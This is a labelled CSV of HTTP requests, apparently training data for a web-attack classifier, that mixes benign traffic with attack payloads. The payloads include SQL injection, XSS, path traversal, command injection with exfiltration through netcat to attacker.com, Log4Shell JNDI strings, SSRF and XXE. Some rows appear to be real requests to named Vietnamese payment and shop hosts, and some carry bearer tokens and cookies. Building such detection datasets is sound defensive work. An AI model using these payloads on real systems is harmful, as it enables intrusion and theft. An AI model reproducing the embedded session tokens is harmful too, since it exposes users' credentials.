method,path,query,headers,body,ua,label
GET,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/favicon.ico,,,,,0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/index.php,option=com_cartweberp&controller=../../../../../../../../etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.04",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.04",1
GET,/,,admin*)(| (password=*)),,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,GET /images/logo.png,,,0
GET,/api/channels/CH1004/products/may-giat-samsung-wa80f19b9bsv-ID128422,,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA5ODYwMTIyODgiLCJzY2hhbm5lbCI6IlZCQSIsInVzZXItaWQiOiJhY2Y3NmFhMi1kYjE1LTQzZDItODEzYi1iNDFhOTEyMmVjM2UiLCJzdWIiOiJWQkFAMDk4NjAxMjI4OCIsImlhdCI6MTc3MDc2NzAzMCwiZXhwIjoxNzcwODUzNDMwfQ.ojCswbgM7iLjGwVmc9aqNav5QNtseS8HxQYI9YlgfBs; Connection: keep-alive; Content-Type: application/json; Cookie: _gcl_au=1.1.2029356548.1770767031; _ga=GA1.1.1614303514.1770767032; _ga_1XRVJ9DDS6=GS2.1.s1770767031$o1$g0$t1770767031$j60$l0$h0; _tt_enable_cookie=1; _ttp=01KH4Z180KWPAY345DTWY88Z9A_.tt.1; _fbp=fb.1.1770767033133.188868519114841088; ttcsid_CQQA2PJC77U11VCBE7G0=1770767032358::P4TZwAbw9svOSqHu3mNq.1.1770767078490.1; ttcsid_CQNEHUJC77UD2I8MDM90=1770767032355::h2wd5m-12fEYVJjLH9HR.1.1770767078837.1; ttcsid=1770767032356::wfwf7Om4zpPYCizb6vFX.1.1770767078837.0; Host: agri-v2.vnshop.vn; Referer: https://agri-v2.vnshop.vn/products/may-giat-samsung-wa80f19b9bsv-ID128422; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Android WebView"";v=""144""; Sec-Ch-Ua-Mobile: ?1; Sec-Ch-Ua-Platform: ""Android""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Linux; Android 14; SM-A556E Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.111 Mobile Safari/537.36; X-Request-Id: de17943a-da49-4cec-9791-2e58c9b2d345; X-Requested-With: com.vnpay.Agribank3g",,"Mozilla/5.0 (Linux; Android 14; SM-A556E Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.111 Mobile Safari/537.36",0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=' OR 'x'='x,Nmap Scripting Engine,1
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /images/logo.png,,,0
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,| id,,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,<body onload=alert(1)>,,,1
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,|| ls -la,,,1
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,GET /api/v1/products,,,0
GET,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/login,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,curl/7.68.0,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/favicon.ico,,,,,0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,/,,; cat /etc/passwd,,,1
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
POST,/profile,,Host: example.com; Accept: */*,username=user285&password=pass894,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,GET /auth/google/callback,,,0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,expect://id,,,1
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/,,GET /docs/api/introduction,,,0
GET,/index.php,option=com_ultimateportfolio&controller=../../../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",1
GET,/,,GET /favicon.ico,,,0
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
PUT,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,GET /favicon.ico,,,0
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,POST /register (detailed user info),,,0
GET,/,,GET /api/v1/ping,,,0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/favicon.ico,,,,,0
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,java\tscript:alert(1),,,1
DELETE,/search,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,Nikto/2.1.6,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/wp-json/wp/v2/gamipress-logs,trigger_type[]=test')%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(6)))x)%20AND%20('a'='a,"Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",,"Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",1
POST,/search,q=phone,Host: example.com; Accept: */*,username=user259&password=pass978,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
POST,/search,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,curl/7.68.0,1
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,POST /register (detailed user info),,,0
GET,/,,GET /user/profile,,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,Host: evil.com,,,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,|| ls -la,,,1
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/ajax/networking/get_netcfg.php,iface=;curl%20d6d5bt565jrc87ck692gzn7euhut788nn.oast.me/`whoami`;,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",1
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,java\tscript:alert(1),,,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/favicon.ico,,,,,0
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,sqlmap/1.5.2,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
DELETE,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,<body onload=alert(1)>,,,1
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/web-api/orders/e12dc4a0-3861-4600-ade8-d7c3aad9424f,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzU1OTI3OTgiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiOGY2YzAyMzItODY0OS00ZDZmLWE4N2QtMGIyM2Y4ZGI1OWViIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzU1OTI3OTgiLCJzdWIiOiJXRUJTSVRFQDA3NzU1OTI3OTgiLCJpYXQiOjE3NzA2MzAyOTksImV4cCI6MTc3MTIzNTA5OX0.m1D5yR4ocUYVn9rLsLZ1TabDebWR3hR6YwQ4s3o_C-U; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: e25c5e4d-73fd-4fc7-abb7-d2bcbb07e52d",,python-requests/2.32.5,0
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,http://127.0.0.1:22,,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/web-api/orders/c2dee52a-5b68-4081-99e1-cd74e97a57da,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzYzNDQwMDIiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiODJjNWUyMmUtMDRlYi00NTEyLWE3ZDItOGU3ZGNjN2EyNDJmIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzYzNDQwMDIiLCJzdWIiOiJXRUJTSVRFQDA3NzYzNDQwMDIiLCJpYXQiOjE3NzA2MzAyMjAsImV4cCI6MTc3MTIzNTAyMH0.co1jQoej-bmU-Ci4vDkD5S8UvaIMK7rK55FmBxF4QPs; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 935c5414-0729-4f81-aee4-40919da9240c",,python-requests/2.32.5,0
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,GET /search?q=C%23,,,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,php://input,,,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,GET /images/logo.png,,,0
GET,/,,query { __schema { types { name } } },,,1
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
POST,/api/v1/orders,,Host: example.com; Accept: */*,username=user243&password=pass781,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,| id,,,1
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /auth/logout/confirm,,,0
DELETE,/search,,Host: example.com; Accept: */*,input=' OR 1=1--,sqlmap/1.5.2,1
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,javascript:alert(1),,,1
GET,/,,GET /api/v1/products/101,,,0
GET,/,,admin*)(| (password=*)),,,1
GET,/,,__proto__[admin]=true,,,1
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,sqlmap/1.5.2,1
GET,/favicon.ico,,,,,0
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,"{""alg"":""none""}",,,1
GET,/,,GET /locales/vi-VN.json,,,0
GET,/favicon.ico,,,,,0
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,admin*)(| (password=*)),,,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,Host: evil.com,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE,/admin,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",Nikto/2.1.6,1
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,GET /api/v1/ping,,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
